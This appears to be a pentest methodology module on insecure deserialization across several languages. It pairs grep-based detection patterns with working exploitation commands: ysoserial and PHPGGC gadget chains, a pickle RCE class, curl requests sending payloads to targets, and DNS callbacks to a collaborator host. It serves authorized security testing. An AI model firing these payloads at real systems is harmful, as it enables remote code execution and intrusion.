# VULN MODULE — Insecure Deserialization
# Asset: webapp (Java, PHP, Python, Ruby, .NET, Node.js)
# CWE-502 | Report prefix: WEB-DESER

## THREAT MODEL

Deserialization converts bytes back into objects. When user-controlled data
reaches a deserializer, an attacker can supply a crafted payload that:
- Executes arbitrary code via gadget chains in the classpath/codebase
- Achieves RCE, authentication bypass, privilege escalation, or DoS
- Bypasses business logic by manipulating object state

Criticality: any confirmed deserialization of untrusted data is at minimum High.
If a known gadget chain exists in the dependency tree → Critical.

## WHITEBOX PATTERNS

```bash
# Java
grep -rn "ObjectInputStream\|readObject\|readResolve\|readExternal" --include="*.java"
grep -rn "XMLDecoder\|XStream\|Kryo\|Jackson\|Gson\|JsonParser" --include="*.java"
grep -rn "deserialize\|fromXML\|readValue" --include="*.java"
# Check pom.xml/build.gradle for: commons-collections, spring-framework,
# groovy, beanutils, commons-beanutils — all known gadget sources

# PHP
grep -rn "unserialize(\b" --include="*.php"
grep -rn "maybe_unserialize(" --include="*.php"
# Any user-controlled string reaching unserialize() is Critical

# Python
grep -rn "pickle\.loads\|pickle\.load\|cPickle" --include="*.py"
grep -rn "yaml\.load\b" --include="*.py"        # safe: yaml.safe_load
grep -rn "marshal\.loads" --include="*.py"
grep -rn "jsonpickle\.decode" --include="*.py"

# Ruby
grep -rn "Marshal\.load\|YAML\.load\b\|JSON\.load\b" --include="*.rb"
# YAML.safe_load and JSON.parse are safe; YAML.load and JSON.load are not

# Node.js
grep -rn "node-serialize\|serialize-javascript\|eval(" --include="*.js"
grep -rn "unserialize\b" --include="*.js"

# .NET
grep -rn "BinaryFormatter\|SoapFormatter\|NetDataContractSerializer" --include="*.cs"
grep -rn "JavaScriptSerializer\|XmlSerializer\|DataContractSerializer" --include="*.cs"
grep -rn "TypeNameHandling\|deserialize" --include="*.cs" -i
```

## DETECTION — BLACKBOX

```bash
# Java — look for base64 blobs that start with recognizable magic bytes
# Serialized Java objects start with: AC ED 00 05 (hex) = rO0AB (base64)
echo "rO0AB" | grep -q "rO0AB" && echo "Java serialized object found"

# Test endpoints for deserialization:
# - Cookies containing base64-encoded objects
# - Hidden form fields with serialized data
# - ViewState (ASP.NET): typically base64 in __VIEWSTATE
# - JWT-like tokens that are actually serialized objects

# PHP session files — look for serialized data in cookies
# PHP serialize format: s:5:"hello"; a:2:{s:3:"key";s:3:"val";}
# If cookie value matches: [a-zA-Z]:\d+:{...} → PHP serialized

# Check Content-Type: application/x-java-serialized-object
curl -sI https://target.com/api/endpoint | grep -i "content-type"
```

## EXPLOITATION

### Java — ysoserial gadget chains
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# List available gadget chains
java -jar ysoserial-all.jar --help 2>&1 | grep "^[A-Z]"

# Generate payload for Commons Collections 3.1
java -jar ysoserial-all.jar CommonsCollections1 'id' | base64 -w0

# Generate DNS callback payload (safe PoC — only DNS, no code exec)
java -jar ysoserial-all.jar URLDNS 'http://your-collaborator.oastify.com' | base64 -w0

# Test via HTTP:
curl -s -X POST https://target.com/api/process \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser

# Test via cookie (if cookie is deserialized):
curl -s https://target.com/profile \
  -H "Cookie: session=$(java -jar ysoserial-all.jar CommonsCollections1 'id' | base64 -w0)"
```

### PHP — magic method gadget chains
```php
<?php
// PHP deserialization abuses magic methods: __wakeup, __destruct, __toString
// Find classes with these methods in the codebase:
grep -rn "function __wakeup\|function __destruct\|function __toString" --include="*.php"

// Craft a PHP serialized payload:
// If class "Config" has __destruct that calls eval($this->cmd):
$obj = new stdClass();
$obj->cmd = 'system("id");';
echo serialize($obj);
// Output: O:8:"stdClass":1:{s:3:"cmd";s:12:"system("id")";}
?>

# PHPGGC — PHP gadget chain generator (like ysoserial for PHP)
git clone https://github.com/ambionics/phpggc
php phpggc --list
php phpggc Laravel/RCE1 system id
php phpggc Monolog/RCE1 system id | base64
```

### Python — pickle RCE
```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
# Send as cookie or parameter value
```

### Ruby — YAML/Marshal
```ruby
# Ruby YAML.load RCE via Gem::Requirement gadget
payload = "--- !ruby/object:Gem::Requirement\nrequirements:\n  - !ruby/object:Gem::Package::TarReader\n    io: !ruby/object:Net::BufferedIO\n      io: !ruby/object:Gem::Package::TarReader::Entry\n        header: x\n        ..."
```

### .NET — BinaryFormatter
```bash
# ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "id"
ysoserial.exe -f ViewState -g TypeConfuseDelegate -c "id" --path="/page.aspx" --apppath="/"
```

## SAFE PoC STRATEGY

Always use DNS callback as first PoC (no damage, proves deserialization):
```bash
# ysoserial URLDNS payload — only triggers DNS lookup, no code execution
java -jar ysoserial-all.jar URLDNS 'http://UNIQUE-ID.burpcollaborator.net' | base64 -w0
# If collaborator receives DNS query → deserialization confirmed
# Then escalate to RCE payload in separate step
```
